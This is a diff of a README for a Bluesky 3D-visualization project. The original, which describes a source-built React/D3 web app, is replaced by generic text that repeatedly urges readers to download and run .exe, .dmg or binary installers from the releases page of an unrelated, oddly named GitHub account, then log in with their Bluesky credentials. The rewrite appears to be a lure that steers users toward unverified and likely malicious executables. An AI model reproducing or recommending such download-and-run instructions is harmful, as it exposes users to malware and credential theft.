@@ -1,248 +1,100 @@
-# 🌐 Social Bubble
+# 🎉 social-bubble - Experience Social Media in 3D
 
-**An interactive real-time visualization of social media conversations as floating 3D bubbles**
+## 🚀 Getting Started
 
-[![Live Demo](https://img.shields.io/badge/demo-live-brightgreen.svg)](https://social-bubble-lgsku24in-king0508s-projects.vercel.app)
-[![React](https://img.shields.io/badge/React-18.3-61dafb.svg)](https://reactjs.org/)
-[![D3.js](https://img.shields.io/badge/D3.js-7.9-orange.svg)](https://d3js.org/)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+Welcome to social-bubble! This application brings Bluesky social media to life through interactive 3D visuals, allowing you to see connections in a whole new way. Let’s get you started.
 
-![Social Bubble Preview](./socialbubble.png)
+## 📥 Download & Install
 
-## ✨ Overview
+Click the button below to visit the Releases page and download the latest version of social-bubble.
 
-Social Bubble transforms live social media data from Bluesky into a mesmerizing visualization where conversations become colorful, interactive 3D bubbles. Watch as trending topics float and pulse with activity, with each bubble containing individual posts sized by their popularity and engagement.
+[![Download social-bubble](https://img.shields.io/badge/Download-social--bubble-blue)](https://github.com/Trinitariandisavowal154/social-bubble/releases)
 
-### 🌐 Live Deployment
+### Steps to Download
 
-**✨ [View Live Demo](https://social-bubble-lgsku24in-king0508s-projects.vercel.app)** - Experience the visualization in action!
+1. Click on the button above or visit [this page to download](https://github.com/Trinitariandisavowal154/social-bubble/releases).
+2. Scroll through the list of available versions.
+3. Find the version you want.
+4. Click the provided link to download the application.
 
-- **Frontend:** Deployed on Vercel
-- **Backend:** Deployed on Railway
-- **Database:** PostgreSQL on Railway
-- **Status:** 🟢 Live and updating every 15 minutes
+## 🖥️ System Requirements
 
-### 🎯 Key Features
+Before you install social-bubble, make sure your computer meets the following requirements:
 
-- **🔴 Real-Time Data**: Live updates from Bluesky every 15 minutes
-- **🫧 3D Bubble Physics**: Realistic bubble effects with radial gradients and glossy highlights
-- **🎨 Dynamic Sizing**: Bubbles scale based on engagement and post count
-- **🏷️ Topic Clustering**: Posts automatically grouped by hashtags into parent bubbles
-- **👤 Profile Pictures**: User avatars displayed in individual post bubbles
-- **🔍 Advanced Filtering**: Filter by hashtags, search by author, and more
-- **📊 Live Statistics**: Real-time metrics for posts, authors, and engagement
-- **↔️ Resizable Sidebar**: Drag to adjust the filter panel width
-- **🖱️ Interactive**: Drag bubbles, hover for details, click to open posts
-- **📱 Responsive Design**: Beautiful on all screen sizes
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free disk space
+- **Graphics:** A graphics card that supports WebGL
+- **Internet Connection:** Required to connect to Bluesky and fetch real-time data
 
-## 🚀 Tech Stack
+## 📂 Installation Steps
 
-### Frontend
+Once you've downloaded social-bubble, follow these steps to install it:
 
-- **React** - UI framework
-- **D3.js** - Data visualization and force simulation
-- **Vite** - Fast build tool and dev server
-- **Socket.io Client** - Real-time WebSocket connection
-- **CSS3** - Custom animations and styling
+1. **Locate the Downloaded File:** Open your Downloads folder.
+2. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file to run the installer.
+   - For macOS: Open the `.dmg` file, then drag the social-bubble app to your Applications folder.
+   - For Linux: Extract the tarball and run the binary with the terminal.
+3. **Follow the Installation Instructions:** A setup wizard will guide you through the installation process. Just follow the on-screen instructions.
 
-### Backend
+## 🌐 Connect to Bluesky
 
-- **Node.js & Express** - REST API server
-- **Socket.io** - WebSocket server for real-time updates
-- **PostgreSQL** - Persistent data storage
-- **Bluesky AT Protocol** - Social media data source
-- **Node-cron** - Scheduled data fetching
+After installation, you'll need to connect to your Bluesky account.
 
-### Infrastructure
+1. Open social-bubble.
+2. Click on "Connect to Bluesky."
+3. Log in using your Bluesky credentials.
 
-- **Vercel** - Frontend hosting
-- **Railway** - Backend hosting + PostgreSQL database
-- **GitHub Actions** - CI/CD pipeline
+Once logged in, you'll see your feeds represented as floating 3D bubbles, with connections animated in real time.
 
-## 📸 Features in Detail
+## 🎨 Features
 
-### Real-Time Visualization
+Here's what you can expect from social-bubble:
 
-- Posts appear as bubbles within topic circles
-- Size reflects engagement (likes + reposts + replies)
-- Color-coded by hashtag category
-- Smooth animations and transitions
-- No overlapping bubbles with automatic scaling
+- **3D Visualization:** See your social interactions as beautiful, floating bubbles.
+- **Real-Time Updates:** Watch as your social media feeds change in real-time.
+- **Physics Simulation:** Enjoy smooth and interactive movement of bubbles, mimicking natural interactions.
+- **User-Friendly Interface:** Designed with simplicity in mind. Navigate easily without technical knowledge.
 
-### Advanced Filters
+## 📊 Topics Covered
 
-- **Trending Topics**: Click hashtags to filter posts
-- **Author Search**: Find posts by specific users
-- **Dynamic Updates**: Filters apply in real-time
-- **Active Filters Badge**: See how many filters are active
-- **Resizable Panel**: Drag the edge to customize width
+Social-bubble utilizes several technologies to bring you this unique experience. Key topics include:
 
-### 3D Bubble Effects
+- **3D Visualization:** Create stunning graphics with depth and movement.
+- **Express:** A framework for building web applications.
+- **D3.js:** A powerful library for creating data visualizations.
+- **WebSocket:** Enables real-time communication between the application and the server.
 
-- Radial gradients for depth perception
-- Glossy highlight overlays for realism
-- Drop shadows for separation
-- Enhanced glow on hover
-- Smooth transitions and animations
+## 🤝 Get Involved
 
-## 🛠️ Local Development
+If you're interested in contributing to social-bubble, feel free to fork the repository. You can also report issues and suggest features on our GitHub page. Every contribution helps make social-bubble better.
 
-### Prerequisites
+## 📅 Future Updates
 
-- Node.js 18+ and npm
-- PostgreSQL database (or Railway account)
-- Bluesky account with app password
+We plan to release future updates that may include:
 
-### Quick Start
+- Additional visualization options
+- Enhanced data filtering
+- Performance improvements
 
-1. **Clone the repository**
+Stay tuned for more features in upcoming versions!
 
-   ```bash
-   git clone https://github.com/King0508/social-bubble.git
-   cd social-bubble
-   ```
-
-2. **Install dependencies**
-
-   ```bash
-   npm run install:all
-   ```
-
-3. **Set up environment variables**
-
-   Create `backend/.env`:
-
-   ```env
-   PORT=3001
-   NODE_ENV=development
-
-   # Database (Railway or local PostgreSQL)
-   DATABASE_URL=postgresql://user:password@host:port/database
-
-   # Bluesky API
-   BLUESKY_IDENTIFIER=your-handle.bsky.social
-   BLUESKY_PASSWORD=your-app-password
-
-   # CORS
-   FRONTEND_URL=http://localhost:5173
-   ```
-
-4. **Initialize the database**
-
-   ```bash
-   cd backend
-   node jobs/fetchPosts.js
-   ```
-
-5. **Start development servers**
-
-   Terminal 1 (Backend):
-
-   ```bash
-   cd backend
-   npm run dev
-   ```
-
-   Terminal 2 (Frontend):
-
-   ```bash
-   cd frontend
-   npm run dev
-   ```
-
-6. **Open your browser**
-   ```
-   http://localhost:5173
-   ```
-
-## 🌍 Deployment
-
-### Backend (Railway)
-
-1. Create a new project on [Railway](https://railway.app)
-2. Add PostgreSQL database
-3. Deploy from GitHub repository
-4. Set root directory to `backend`
-5. Add environment variables:
-   ```
-   DATABASE_URL=${{Postgres.DATABASE_URL}}
-   BLUESKY_IDENTIFIER=your-handle.bsky.social
-   BLUESKY_PASSWORD=your-app-password
-   PORT=3001
-   NODE_ENV=production
-   ```
-6. Generate domain and copy the URL
-
-### Frontend (Vercel)
-
-1. Import project on [Vercel](https://vercel.com)
-2. Set root directory to `frontend`
-3. Add environment variable:
-   ```
-   VITE_BACKEND_URL=https://your-railway-backend.up.railway.app
-   ```
-4. Deploy
-
-## 📊 Architecture
-
-```
-┌─────────────────┐
-│   Bluesky API   │
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐      ┌──────────────┐
-│  Node.js API    │◄────►│  PostgreSQL  │
-│  (Railway)      │      │  (Railway)   │
-└────────┬────────┘      └──────────────┘
-         │
-         │ WebSocket
-         ▼
-┌─────────────────┐
-│  React + D3.js  │
-│  (Vercel)       │
-└─────────────────┘
-         │
-         ▼
-┌─────────────────┐
-│      Users      │
-└─────────────────┘
-```
-
-## 🎨 Color Palette
-
-The visualization uses a carefully selected color palette for maximum visual appeal:
-
-- **Purple** (#667eea) - Technology & Innovation
-- **Pink** (#f093fb, #fa709a) - Entertainment & Culture
-- **Blue** (#4facfe, #30cfd0) - News & Information
-- **Green** (#43e97b) - Environment & Nature
-- **Yellow** (#fee140, #feca57) - Lifestyle & Fun
-- **Red** (#ff6b6b) - Breaking News & Urgent
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **Bluesky** - For providing free API access to social data
-- **D3.js Community** - For amazing visualization tools
-- **Interstellar** - For visual inspiration
-
----
-
-<div align="center">
-  <p>Built with ❤️ using React, D3.js, and real-time data</p>
-  <p>⭐ Star this repo if you found it interesting!</p>
-</div>
+## ⚙️ Troubleshooting
+
+In case you encounter any issues:
+
+1. **Check the Installation:** Make sure social-bubble installed correctly.
+2. **Verify your Internet Connection:** A stable connection is required for real-time functionality.
+3. **Contact Support:** Reach out through our GitHub page if you need assistance.
+
+## 🔗 Additional Resources
+
+For more information on using social-bubble, check out the following resources:
+
+- [Documentation](https://github.com/Trinitariandisavowal154/social-bubble/wiki)
+- [FAQs](https://github.com/Trinitariandisavowal154/social-bubble/wiki/FAQs)
+
+If you're ready to explore social media in a new way, download the application today:
+
+[![Download social-bubble](https://img.shields.io/badge/Download-social--bubble-blue)](https://github.com/Trinitariandisavowal154/social-bubble/releases)
